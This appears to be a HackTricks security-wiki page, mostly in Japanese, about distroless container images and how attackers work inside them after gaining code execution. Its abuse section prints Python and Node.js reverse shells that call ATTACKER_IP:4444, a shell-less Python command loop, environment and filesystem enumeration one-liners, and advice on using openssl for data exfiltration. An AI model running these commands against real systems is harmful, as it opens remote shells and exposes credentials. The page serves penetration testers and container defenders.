# Distroless コンテナ

{{#include ../../../banners/hacktricks-training.md}}

## 概要

A **distroless** container image は、特定のアプリケーションを実行するために必要な **最小限のランタイムコンポーネントだけを同梱**し、意図的にパッケージマネージャやシェル、汎用のユーザーランドユーティリティの大部分といった通常の配布用ツール群を除外したイメージです。実務では、distroless イメージはしばしばアプリケーションバイナリやランタイム、その共有ライブラリ、証明書バンドル、非常に小さなファイルシステム構成だけを含みます。

ポイントは distroless が新しいカーネル隔離プリミティブというわけではないということです。Distroless は **イメージ設計の戦略**です。カーネルがコンテナをどのように隔離するかではなく、コンテナファイルシステムの内部で何が利用可能かを変えます。この区別は重要です。なぜなら distroless は主にコード実行を得た後に攻撃者が利用できるものを減らすことで環境を強化するからで、namespaces、seccomp、capabilities、AppArmor、SELinux、その他のランタイム隔離メカニズムの代わりになるものではありません。

## Distroless が存在する理由

Distroless イメージは主に以下を減らすために使われます:

- イメージサイズ
- イメージの運用上の複雑さ
- 脆弱性を含む可能性のあるパッケージやバイナリの数
- 攻撃者がデフォルトで利用できる post-exploitation ツールの数

そのため、Distroless イメージは本番アプリケーションのデプロイで人気があります。シェルもパッケージマネージャもほとんどの汎用ツールも含まないコンテナは、運用上理由付けがしやすく、侵害後に対話的に悪用されにくいことが多いです。

よく知られた distroless スタイルのイメージファミリーの例:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless が意味しないこと

Distroless コンテナは **自動的に次のようなものではありません**:

- 自動的に rootless である
- 自動的に非特権である
- 自動的に読み取り専用である
- 自動的に seccomp、AppArmor、または SELinux によって保護されている
- 自動的にコンテナエスケープから安全である

`--privileged`、ホストの namespace 共有、危険な bind mount、またはマウントされた runtime socket を使って distroless イメージを実行することは依然として可能です。そのような状況では、イメージ自体は最小限でも、コンテナは壊滅的に安全でない可能性があります。Distroless は **userland attack surface** を変更するのであって、**kernel trust boundary** を変えるものではありません。

## 一般的な運用上の特徴

distroless コンテナを侵害すると、最初に気付くことの多い点は、一般的な前提が通用しなくなることです。`sh` がない、`bash` がない、`ls` や `id` や `cat` がない、場合によっては通常のトレードクラフトが期待するような振る舞いをする libc ベースの環境すら存在しないことがあります。ツールが欠如しているため、攻撃側・防御側双方でデバッグ、インシデント対応、post-exploitation の手法が変わります。

よくあるパターンは次の通りです:

- アプリケーションランタイムは存在するが、それ以外はほとんどない
- シェルベースのペイロードはシェルがないため失敗する
- 補助バイナリがないため一般的な列挙のワンライナーが失敗する
- rootfs を読み取り専用にしたり、書き込み可能な tmpfs に `noexec` が設定されているなどのファイルシステム保護も存在することが多い

これらの組み合わせが、しばしば人々が "weaponizing distroless" について話す原因になります。

## Distroless と Post-Exploitation

distroless 環境での主な攻撃上の課題は、初期の RCE だけではないことが多く、次に何をするかが問題になります。もし標的のワークロードが Python、Node.js、Java、Go のような言語ランタイムでコード実行を与える場合、任意のロジックを実行できる可能性はありますが、他の多くの Linux ターゲットで一般的なシェル中心のワークフローは使えないことがよくあります。

つまり、post-exploitation はしばしば次の三方向のいずれかにシフトします:

1. 既存の言語ランタイムを直接利用して、環境を列挙したり、ソケットを開いたり、ファイルを読み取ったり、追加のペイロードをステージする。
2. ファイルシステムが読み取り専用であるか、書き込み可能な場所が `noexec` マウントされている場合にメモリ内へ自分のツールを持ち込む。
3. アプリケーションやその依存関係に予期せぬ有用なものが含まれている場合、イメージに既に存在するバイナリを悪用する。

## 悪用

### 既にあるランタイムを列挙する

多くの distroless コンテナではシェルが存在しませんが、アプリケーションランタイムは残っています。標的が Python サービスなら Python があり、Node.js なら Node が存在します。それによってファイル列挙、環境変数の読み取り、reverse shells のオープン、`/bin/sh` を呼び出さずにメモリ内での実行をステージするのに十分な機能が得られることがよくあります。

Python を使った簡単な例:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js を使った簡単な例:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
影響:

- 環境変数の回復（多くの場合、認証情報やサービスエンドポイントを含む）
- ファイルシステムの列挙（`/bin/ls` がない場合）
- 書き込み可能なパスやマウントされたシークレットの特定

### Reverse Shell — `/bin/sh` がない場合

イメージに `sh` や `bash` が含まれていない場合、従来のシェルベースの reverse shell は即座に失敗することがあります。その場合は、代わりにインストールされている言語ランタイムを使用してください。

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh` が存在しない場合、最後の行を直接 Python によるコマンド実行に置き換えるか、Python の REPL ループにしてください。

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
繰り返しますが、`/bin/sh` が存在しない場合は、シェルを起動する代わりに Node's filesystem, process, and networking APIs を直接使用してください。

### 完全な例: シェルなし Python コマンドループ

イメージに Python はあるがシェルがまったくない場合、単純なインタラクティブループだけで完全な post-exploitation 機能を維持するのに十分なことが多い:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
これは対話型シェルバイナリを必要としない。攻撃者の観点では影響は基本的なシェルと実質的に同じであり、コマンド実行、enumeration、および既存のランタイムを介したさらなるペイロードのステージングが可能になる。

### In-Memory Tool Execution

Distroless images はしばしば次と組み合わされる:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

この組み合わせにより、従来の "download binary to disk and run it" ワークフローは信頼できなくなる。その場合、memory execution techniques が主な解決策になる。

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### 既にイメージ内に存在するバイナリ

一部のDistrolessイメージには運用上必要なバイナリが残っており、侵害後に有用になることがある。繰り返し観察される例としては `openssl` があり、アプリケーションが crypto- や TLS 関連の処理でそれを必要とする場合がある。

簡単な検索パターンは:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` is present, it may be usable for:

- アウトバウンド TLS 接続
- 許可された egress チャネルを経由した data exfiltration
- encoded/encrypted blobs を介した payload データの staging

The exact abuse depends on what is actually installed, but the general idea is that distroless does not mean "no tools whatsoever"; it means "far fewer tools than a normal distribution image".

## Checks

The goal of these checks is to determine whether the image is really distroless in practice and which runtime or helper binaries are still available for post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:

- シェルが存在しないが Python や Node のようなランタイムがある場合、post-exploitation はランタイム駆動の実行へピボットするべきである。
- ルートファイルシステムが読み取り専用で、`/dev/shm` が書き込み可能だが `noexec` の場合、メモリ実行の手法がより重要になる。
- `openssl`、`busybox`、`java` のようなヘルパーバイナリが存在する場合、それらでさらにアクセスをブートストラップするのに十分な機能が提供される可能性がある。

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | 設計上最小限のユーザーランド | シェルなし、パッケージマネージャなし、アプリケーション/ランタイム依存のみ | デバッグレイヤの追加、sidecar シェル、busybox やツール類のコピー |
| Chainguard minimal images | 設計上最小限のユーザーランド | パッケージ表面が削減され、しばしば単一のランタイムやサービスに特化 | `:latest-dev` やデバッグ版の使用、ビルド時にツールをコピー |
| Kubernetes workloads using distroless images | Pod 設定に依存 | Distroless はユーザーランドにのみ影響し、Pod のセキュリティ姿勢は Pod spec とランタイムのデフォルトに依存する | エフェメラルなデバッグコンテナの追加、ホストマウント、privileged な Pod 設定 |
| Docker / Podman running distroless images | 実行フラグに依存 | ファイルシステムは最小限だが、ランタイムのセキュリティはフラグやデーモン設定に依存する | `--privileged`、ホストネームスペース共有、ランタイムソケットマウント、書き込み可能なホストバインド |

The key point is that distroless is an **image property**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
